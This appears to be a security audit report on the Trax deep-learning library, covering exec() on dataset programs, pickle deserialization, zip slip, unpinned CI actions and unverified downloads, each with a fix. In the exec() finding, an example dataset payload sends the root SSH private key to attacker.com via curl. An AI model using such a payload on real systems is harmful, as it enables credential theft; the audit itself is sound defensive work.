CVE-Eligible

Trax is a Python deep-learning library with significant security concerns. The most critical finding is the use of exec() in trax/data/tf_inputs.py to execute Python programs from dataset records — if an attacker can control dataset content (e.g., via a malicious MathQA dataset file), arbitrary code execution at training time is possible. Multiple instances of pickle.load() on checkpoint files from potentially attacker-controlled paths allow for deserialization attacks. The CI/CD pipeline uses unpinned action tags (@v2) and an end-of-life Python version (3.7). The urllib.request.urlretrieve() call downloads model files over HTTPS without certificate verification callbacks, and extracts ZIP archives without path traversal protection (zip slip). No hardcoded secrets were found. Trax appears to be in maintenance mode (last release 1.4.1), which increases risk from unpatched vulnerabilities.

Confirmed Vulnerabilities

CRITICAL Arbitrary Code Execution via exec() on Dataset-Derived Python Programs TRAX-001
File: trax/data/tf_inputs.py Lines: 2262, 2409 CVSS v3: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) CWE: CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

The function execute_mathqa_program() at line 2244 and the code within CreateMathQAInputs() at line 2409 call Python's built-in exec() to execute arbitrary Python code assembled from dataset records. The program argument is a list of strings read from a MathQA dataset file (dataset_path), which is a user-configurable parameter. If a malicious actor places a crafted dataset file at the path provided via gin config or as dataset_path argument, the exec() call will execute that code with the full Python runtime environment. The function deliberately passes globals() as the globals dictionary, meaning the executed code has access to all global symbols including imported modules like os, subprocess, tf, etc. The bare except: clause silently swallows exceptions, masking exploitation.

Evidence

# trax/data/tf_inputs.py, line 2244-2270
def execute_mathqa_program(problem, program):
  """Executes the DSL code for a given problem."""
  del problem
  program = '\n'.join(program)   # program comes from dataset file
  var_dict = {}
  try:
    exec(program, globals(), var_dict)  # <-- CRITICAL: exec with globals()
    if 'answer' in var_dict and is_number(var_dict['answer']):
      return float(var_dict['answer'])
    else:
      return None
  except:  # pylint: disable=bare-except
    return None   # <-- exceptions silently swallowed

# Line 2409 (within CreateMathQAInputs, also gin.configurable):
exec(target_values, globals(), var_dict)  # <-- same pattern, assembled from dataset

Exploit Scenario

An attacker supplies a crafted MathQA-format dataset file (either by controlling the dataset_path gin config parameter, or by performing a man-in-the-middle attack on the dataset download, or by poisoning a shared dataset directory) containing entries like:

{"programs": ["import subprocess; subprocess.run(['curl','https://attacker.com/?k='+open('/root/.ssh/id_rsa').read()])"]}

When training is initiated against this dataset, the exec() fires and executes the attacker's code in the training environment, which may have access to GPU clusters, model weights, training secrets, and cloud credentials.

Remediation

Replace exec() with a restricted evaluator. For arithmetic programs (MathQA), use ast.literal_eval() for constant expressions or implement a custom DSL interpreter for the MathQA operation set. Avoid exec() entirely. If exec is unavoidable, use a sandboxed subprocess with resource limits and no access to globals, network, or filesystem.

HIGH Unsafe Deserialization via pickle.load() on Checkpoint Files TRAX-002
Files: trax/supervised/training.py (L1258, L1261), trax/layers/base.py (L333), trax/rl/training.py (L154), trax/data/inputs.py (L1115) CVSS v3: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) CWE: CWE-502 (Deserialization of Untrusted Data)

Trax uses Python's pickle module to serialize and deserialize model checkpoints, layer weights, and training state. The unpickle_from_file() function in supervised/training.py, load_from_file() in layers/base.py, checkpoint loading in rl/training.py, and load_data_counters() in data/inputs.py all call pickle.load(f) on files from user-controlled output directories. Python pickle deserialization can execute arbitrary code via __reduce__ methods. An attacker who can place a malicious .pkl or .pkl.gz file in the model checkpoint directory (via a compromised storage bucket, shared NFS, or network-accessible GCS path) can achieve arbitrary code execution when training is resumed from that checkpoint.

Evidence

# trax/supervised/training.py, line 1253-1265
def unpickle_from_file(file_path, gzip=False):
  """Unpickle obj from file_path with gzipping."""
  with tf.io.gfile.GFile(file_path, 'rb') as f:
    if not gzip:
      obj = pickle.load(f)      # <-- No validation of file source or content
    else:
      with gzip_lib.GzipFile(fileobj=f, compresslevel=2) as gzipf:
        obj = pickle.load(gzipf) # <-- Same issue with gzipped checkpoint
  return obj

# trax/layers/base.py, line 333 (loads weights and state from checkpoint)
  with tf.io.gfile.GFile(file_name, 'rb') as f:
    with gzip.GzipFile(fileobj=f, compresslevel=2) as gzipf:
      dictionary = pickle.load(gzipf)  # <-- model weights checkpoint

Remediation

Replace pickle with a safer serialization format for checkpoints. Use numpy's .npy/.npz format for weight arrays (already partially done — the code checks for separate .npy weight files), and JSON or protocol buffers for the metadata dictionary. If pickle must remain for legacy compatibility, add cryptographic signing (HMAC-SHA256) of checkpoint files and verify the signature before deserialization. At minimum, document that checkpoint directories must be trusted sources.

HIGH Zip Slip: Path Traversal in Model Download and Extraction (bert.py) TRAX-003
File: trax/models/research/bert.py Lines: 237-249 CVSS v3: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) CWE: CWE-22 (Path Traversal / Zip Slip)

The PretrainedBERT.download_model() method downloads a ZIP archive from a hardcoded URL (https://storage.googleapis.com/bert_models/...) and extracts it using zipfile.ZipFile.extractall() without validating member paths. The extractall() method is documented to be vulnerable to "Zip Slip" — a ZIP archive can contain entries with paths like ../../etc/cron.d/malicious that escape the extraction directory. While the current URL is hardcoded to a Google Storage bucket, the URL is constructed using _MODEL_LINKS[model_name], and the lookup uses a user-supplied model_name string. Additionally, if the Google Storage bucket is ever misconfigured, renamed, or if a MITM occurs, a malicious ZIP can be delivered.

Evidence

# trax/models/research/bert.py, line 235-249
urllib.request.urlretrieve(model_link, download_path)

if not zipfile.is_zipfile(download_path):
  raise NotImplementedError(...)

with zipfile.ZipFile(download_path, 'r') as zip_ref:
  zip_ref.extractall(download_dir)  # <-- No path validation, Zip Slip vulnerable

os.remove(download_path)

Remediation

Validate all ZIP member paths before extraction:

import os, zipfile

def safe_extract(zip_path, extract_dir):
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.infolist():
            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))
            if not member_path.startswith(os.path.realpath(extract_dir) + os.sep):
                raise ValueError(f"Zip Slip detected: {member.filename}")
        zf.extractall(extract_dir)

Additionally, verify the downloaded file's SHA256 hash against a known-good value stored in _MODEL_LINKS before extraction.

MEDIUM CI/CD: Unpinned GitHub Actions (actions/checkout@v2, actions/setup-python@v2) TRAX-004
File: .github/workflows/build.yaml CVSS v3: 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N) CWE: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

The trax CI workflow uses actions/checkout@v2 and actions/setup-python@v2 without commit-hash pinning. If the v2 tag is moved to a malicious commit (tag mutation attack), the CI pipeline would execute attacker-controlled code in the runner environment. This is particularly risky for a research library that may run on GPU clusters with access to sensitive model weights.

Evidence

# .github/workflows/build.yaml
    - uses: actions/checkout@v2          # <-- unpinned tag
    - uses: actions/setup-python@v2      # <-- unpinned tag
      with:
        python-version: ${{ matrix.python-version }}  # python 3.7 (EOL)

Remediation

Pin actions to specific commit SHAs: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4. Also update the Python version matrix from 3.7 (EOL since June 2023) to 3.10+ to ensure security patches are applied.

MEDIUM CI/CD: Use of End-of-Life Python 3.7 in CI and Likely in Production TRAX-005
File: .github/workflows/build.yaml, setup.py CVSS v3: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) CWE: CWE-1104 (Use of Unmaintained Third-Party Components)

The CI workflow pins python-version: [3.7] and the TensorFlow version to 2.4.*. Python 3.7 reached end-of-life on June 27, 2023 and no longer receives security patches. TensorFlow 2.4.x is similarly end-of-life. Running production workloads on EOL Python exposes any vulnerabilities in the Python runtime or standard library without available patches.

Evidence

# .github/workflows/build.yaml
    strategy:
      matrix:
        python-version: [3.7]      # <-- EOL since June 2023
        tf-version: ["2.4.*"]      # <-- TF 2.4 EOL

Remediation

Update CI to test against Python 3.10, 3.11, or 3.12. Update TensorFlow dependency to a supported version. The setup.py does not specify a Python version constraint, which should be added: python_requires='>=3.10'.

LOW Model Download Without HTTPS Certificate Pinning or Hash Verification TRAX-006
File: trax/models/research/bert.py Lines: 237 CVSS v3: 4.8 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N) CWE: CWE-494 (Download of Code Without Integrity Check)

urllib.request.urlretrieve(model_link, download_path) downloads model weights from Google Storage without verifying the SHA256 hash of the downloaded artifact. While HTTPS is used (standard certificate validation applies), a compromised or replaced GCS object would be silently accepted. Combined with the Zip Slip issue (TRAX-003), this creates a full exploit chain from network position to arbitrary code execution.

Remediation

Store expected SHA256 hashes alongside URLs in _MODEL_LINKS and verify after download:

import hashlib
def verify_sha256(path, expected_hash):
    sha256 = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            sha256.update(chunk)
    if sha256.hexdigest() != expected_hash:
        raise SecurityError(f"Hash mismatch: {sha256.hexdigest()} != {expected_hash}")

Methodology

Trax was analyzed via sparse git clone (filter=tree:0, no blob checkout needed for tree listing). All 198 Python files in the repository were individually fetched via git cat-file -p and scanned for: pickle.load, yaml.load, subprocess with shell=True, os.system, os.popen, eval(), exec(), requests.get, verify=False, urllib.request, hashlib.md5, hashlib.sha1. The build.yaml GitHub Actions workflow was read in full. setup.py was analyzed for dependency constraints. 5-point exploitability gate was applied to all candidates before inclusion as findings.
